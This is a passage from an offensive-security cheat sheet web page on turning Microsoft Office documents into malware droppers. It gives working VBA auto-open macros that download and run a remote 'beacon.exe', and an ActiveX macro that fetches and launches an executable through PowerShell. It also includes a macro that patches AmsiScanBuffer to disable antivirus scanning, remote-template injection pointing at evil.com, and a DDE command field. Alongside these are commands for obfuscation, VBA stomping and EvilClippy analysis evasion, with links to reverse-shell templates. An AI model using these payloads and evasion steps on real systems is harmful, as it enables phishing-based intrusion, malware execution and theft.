<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">python</span> <span class="n">MMG</span><span class="p">.</span><span class="n">py</span> <span class="n">configs</span><span class="p">/</span><span class="n">generic-cmd</span><span class="p">.</span><span class="n">json</span> <span class="n">malicious</span><span class="p">.</span><span class="n">vba</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="p">{</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>    <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Generic command exec payload\nEvasion technique set to none&quot;</span><span class="p">,</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>    <span class="s2">&quot;template&quot;</span><span class="p">:</span> <span class="s2">&quot;templates/payloads/generic-cmd-template.vba&quot;</span><span class="p">,</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    <span class="s2">&quot;varcount&quot;</span><span class="p">:</span> <span class="n">152</span><span class="p">,</span>
<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>    <span class="s2">&quot;encodingoffset&quot;</span><span class="p">:</span> <span class="n">5</span><span class="p">,</span>
<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    <span class="s2">&quot;chunksize&quot;</span><span class="p">:</span> <span class="n">180</span><span class="p">,</span>
<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    <span class="s2">&quot;encodedvars&quot;</span><span class="p">:</span>  <span class="p">{},</span>
<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>    <span class="s2">&quot;vars&quot;</span><span class="p">:</span>     <span class="p">[],</span>
<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>    <span class="s2">&quot;evasion&quot;</span><span class="p">:</span>  <span class="p">[</span><span class="s2">&quot;encoder&quot;</span><span class="p">],</span>
<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>    <span class="s2">&quot;payload&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe /c C:\\Users\\Public\\beacon.exe&quot;</span>
<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>Private Declare PtrSafe Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    On Error GoTo Failed
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    DownloadFileA = False
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>    &#39;As directory must exist, this is a check
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>    If CreateObject(&quot;Scripting.FileSystemObject&quot;).FolderExists(CreateObject(&quot;Scripting.FileSystemObject&quot;).GetParentFolderName(DownloadPath)) = False Then Exit Function
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>    Dim returnValue As Long
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    &#39;If return value is 0 and the file exist, then it is considered as downloaded correctly
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0)
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>    Exit Function
<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>
<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>Failed:
<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>End Function
<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>
<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>Sub AutoOpen()
<a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>    DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot;
<a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>End Sub
<a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>
<a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>
<a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>Sub Auto_Open()
<a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>    DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\Users\\Public\\beacon.exe&quot;
<a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>End Sub
</code></pre></div>
<h3 id="docm-activex-based-inkpicture-control-painted-event-autorun-macro">DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</h3>
<p>Go to <strong>Developer tab</strong> on ribbon <code>-&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control</code> </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Run = Shell(&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&quot;, vbNormalFocus)
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>End Sub
</code></pre></div>
<h3 id="vba-obfuscation">VBA Obfuscation</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c"># https://www.youtube.com/watch?v=L0DlPOLx2k0</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">bonnetn</span><span class="p">/</span><span class="n">vba-obfuscator</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="p">$</span> <span class="nb">cat </span><span class="n">example_macro</span><span class="p">/</span><span class="n">download_payload</span><span class="p">.</span><span class="n">vba</span> <span class="p">|</span> <span class="n">docker</span> <span class="n">run</span> <span class="n">-i</span> <span class="p">-</span><span class="n">-rm</span> <span class="n">bonnetn</span><span class="p">/</span><span class="n">vba-obfuscator</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">stdin</span>
</code></pre></div>
<h3 id="vba-purging">VBA Purging</h3>
<p><strong>VBA Stomping</strong>: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. </p>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p>
<h4 id="officepurge">OfficePurge</h4>
<ul>
<li>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">OfficePurge</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">word</span> <span class="o">-f</span> <span class="p">.\</span><span class="n">malicious</span><span class="p">.</span><span class="n">doc</span> <span class="n">-m</span> <span class="n">NewMacros</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">OfficePurge</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">excel</span> <span class="o">-f</span> <span class="p">.\</span><span class="n">payroll</span><span class="p">.</span><span class="n">xls</span> <span class="n">-m</span> <span class="n">Module1</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">OfficePurge</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">publisher</span> <span class="o">-f</span> <span class="p">.\</span><span class="n">donuts</span><span class="p">.</span><span class="n">pub</span> <span class="n">-m</span> <span class="n">ThisDocument</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">OfficePurge</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">word</span> <span class="o">-f</span> <span class="p">.\</span><span class="n">malicious</span><span class="p">.</span><span class="n">doc</span> <span class="n">-l</span>
</code></pre></div>
<h4 id="evilclippy">EvilClippy</h4>
<blockquote>
<p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files. 
Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c"># OSX/Linux</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">mcs</span> <span class="p">/</span><span class="n">reference</span><span class="p">:</span><span class="n">OpenMcdf</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">.</span><span class="n">dll</span> <span class="p">/</span><span class="n">out</span><span class="p">:</span><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="p">*.</span><span class="n">cs</span> 
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="c"># Windows</span>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">csc</span> <span class="p">/</span><span class="n">reference</span><span class="p">:</span><span class="n">OpenMcdf</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">.</span><span class="n">dll</span> <span class="p">/</span><span class="n">out</span><span class="p">:</span><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="p">*.</span><span class="n">cs</span> 
<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">fake</span><span class="p">.</span><span class="n">vbs</span> <span class="n">-g</span> <span class="n">-r</span> <span class="n">cobaltstrike</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">fakecode</span><span class="p">.</span><span class="n">vba</span> <span class="n">-t</span> <span class="n">2016x86</span> <span class="n">macrofile</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">fakecode</span><span class="p">.</span><span class="n">vba</span> <span class="n">-t</span> <span class="n">2013x64</span> <span class="n">macrofile</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="c"># make macro code unaccessible is to mark the project as locked and unviewable: -u</span>
<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="c"># Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.</span>
<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="n">EvilClippy</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">macrofile</span><span class="p">.</span><span class="n">doc</span>
</code></pre></div>
<h3 id="vba-offensive-security-template">VBA - Offensive Security Template</h3>
<ul>
<li>Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</li>
<li>Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process</li>
<li>RunPE - https://github.com/itm4n/VBA-RunPE</li>
<li>Spoof Parent - https://github.com/py7hagoras/OfficeMacro64</li>
<li>AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</li>
<li>amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</li>
<li>VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</li>
</ul>
<h3 id="vba-amsi">VBA - AMSI</h3>
<blockquote>
<p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</p>
</blockquote>
<p><img alt="" src="https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png" /></p>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p>
<p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p>
<ul>
<li>AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As LongPtr)
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>Private Sub Document_Open()
<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>    Dim AmsiDLL As LongPtr
<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>    Dim AmsiScanBufferAddr As LongPtr
<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>    Dim result As Long
<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>    Dim MyByteArray(6) As Byte
<a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>    Dim ArrayPointer As LongPtr
<a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>
<a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>    MyByteArray(0) = 184 &#39; 0xB8
<a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>    MyByteArray(1) = 87  &#39; 0x57
<a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>    MyByteArray(2) = 0   &#39; 0x00
<a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>    MyByteArray(3) = 7   &#39; 0x07
<a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>    MyByteArray(4) = 128 &#39; 0x80
<a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>    MyByteArray(5) = 195 &#39; 0xC3
<a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>
<a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>    AmsiDLL = LoadLibrary(&quot;amsi.dll&quot;)
<a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, &quot;AmsiScanBuffer&quot;)
<a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
<a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>    ArrayPointer = VarPtr(MyByteArray(0))
<a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
<a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>
<a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>End Sub
</code></pre></div>
<h3 id="docx-template-injection">DOCX - Template Injection</h3>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Does not require "Enable Macro"</p>
<h4 id="remote-template">Remote Template</h4>
<ol>
<li>A malicious macro is saved in a Word template .dotm file</li>
<li>Benign .docx file is created based on one of the default MS Word Document templates</li>
<li>Document from step 2 is saved as .docx</li>
<li>Document from step 3 is renamed to .zip</li>
<li>Document from step 4 gets unzipped</li>
<li><strong>.\word_rels\settings.xml.rels</strong> contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
    <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nt">&lt;Relationships</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;</span><span class="nt">&gt;&lt;Relationship</span><span class="w"> </span><span class="na">Id=</span><span class="s">&quot;rId1&quot;</span><span class="w"> </span><span class="na">Type=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;</span><span class="w"> </span><span class="na">Target=</span><span class="s">&quot;file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx&quot;</span><span class="w"> </span><span class="na">TargetMode=</span><span class="s">&quot;External&quot;</span><span class="nt">/&gt;&lt;/Relationships&gt;</span>
</code></pre></div>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><span class="nt">&lt;Relationships</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;</span><span class="nt">&gt;&lt;Relationship</span><span class="w"> </span><span class="na">Id=</span><span class="s">&quot;rId1&quot;</span><span class="w"> </span><span class="na">Type=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="na">Target=</span><span class="s">&quot;https://evil.com/malicious.dotm&quot;</span><span class="w"> </span><span class="na">TargetMode=</span><span class="s">&quot;External&quot;</span><span class="nt">/&gt;&lt;/Relationships&gt;</span>
</code></pre></div></li>
<li>File gets zipped back up again and renamed to .docx</li>
</ol>
<h4 id="template-injections-tools">Template Injections Tools</h4>
<ul>
<li>https://github.com/JohnWoodman/remoteInjector</li>
<li>https://github.com/ryhanson/phishery</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">$</span> <span class="n">phishery</span> <span class="n">-u</span> <span class="n">https</span><span class="p">://</span><span class="n">secure</span><span class="p">.</span><span class="n">site</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">docs</span> <span class="n">-i</span> <span class="n">good</span><span class="p">.</span><span class="n">docx</span> <span class="n">-o</span> <span class="n">bad</span><span class="p">.</span><span class="n">docx</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="p">[+]</span> <span class="n">Opening</span> <span class="n">Word</span> <span class="n">document</span><span class="p">:</span> <span class="n">good</span><span class="p">.</span><span class="n">docx</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="p">[+]</span> <span class="n">Setting</span> <span class="n">Word</span> <span class="n">document</span> <span class="n">template</span> <span class="n">to</span><span class="p">:</span> <span class="n">https</span><span class="p">://</span><span class="n">secure</span><span class="p">.</span><span class="n">site</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">docs</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="p">[+]</span> <span class="n">Saving</span> <span class="n">injected</span> <span class="n">Word</span> <span class="n">document</span> <span class="n">to</span><span class="p">:</span> <span class="n">bad</span><span class="p">.</span><span class="n">docx</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="p">[*]</span> <span class="n">Injected</span> <span class="n">Word</span> <span class="n">document</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span><span class="p">!</span>
</code></pre></div>
<h3 id="docx-dde">DOCX - DDE</h3>
<ul>
<li>Insert &gt; QuickPart &gt; Field</li>
<li>Right Click &gt; Toggle Field Code</li>
<li><code>{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }</code></li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://itm4n.github.io/vba-runpe-part1/">VBA RunPE Part 1 - itm4n</a></li>
<li><a href="https://itm4n.github.io/vba-runpe-part2/">VBA RunPE Part 2 - itm4n</a></li>
<li><a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">Office VBA AMSI Parting the veil on malicious macros - Microsoft</a></li>
<li><a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Bypassing AMSI fro VBA - Outflank</a></li>
<li><a href="https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/">Evil Clippy MS Office Maldoc Assistant - Outflank</a></li>
<li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">Old schoold evil execl 4.0 macros XLM - Outflank</a></li>
<li><a href="https://bytecod3r.io/excel-4-macro-generator-x86-x64/">Excel 4 Macro Generator x86/x64 - bytecod3r</a></li>
<li><a href="https://github.com/Pepitoh/VBad">VBad - Pepitoh</a></li>
<li><a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf">Excel 4.0 Macro Function Reference PDF</a></li>
<li><a href="https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/">Excel 4.0 Macros so hot right now - SneekyMonkey</a></li>
<li><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/">Macros and more with sharpshooter v2.0 - mdsec</a></li>
<li><a href="https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/">Further evasion in the forgotten corners of ms xls - malware.pizza</a></li>
<li><a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Excel 4.0 macro old but new - fsx30</a></li>
<li><a href="https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/">XLS 4.0 macros and covenant - d-sec</a></li>
<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros">Inject macro from a remote dotm template - ired.team</a></li>
<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk">Phishinh with OLE - ired.team</a></li>
<li><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel">Phishing SLK - ired.team</a>bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li>
<li><a href="https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/">PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</a></li>
<li><a href="https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/">AMSI in the heap - rmdavy</a></li>
<li><a href="https://github.com/rmdavy/WordAmsiBypass">WordAMSIBypass - rmdavy</a></li>
<li><a href="https://blog.f-secure.com/dechaining-macros-and-evading-edr/">Dechaining macros and evading EDR - Noora Hyvärinen</a></li>
<li><a href="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html">Executing macros from docx with remote - RedXORBlueJuly 18, 2018</a></li>
<li><a href="https://adepts.of0x.cc/alternatives-copy-shellcode/">One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</a></li>
<li><a href="http://www.greyhathacker.net/?p=948">Running macros via ActiveX controls - greyhathacker - September 29, 2016</a></li>
<li><a href="https://www.goggleheadedhacker.com/blog/post/23">Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</a></li>
<li><a href="https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/">So you think you can block Macros? - Pieter Ceelen - April 25, 2023</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 15, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
    
  </body>
</html>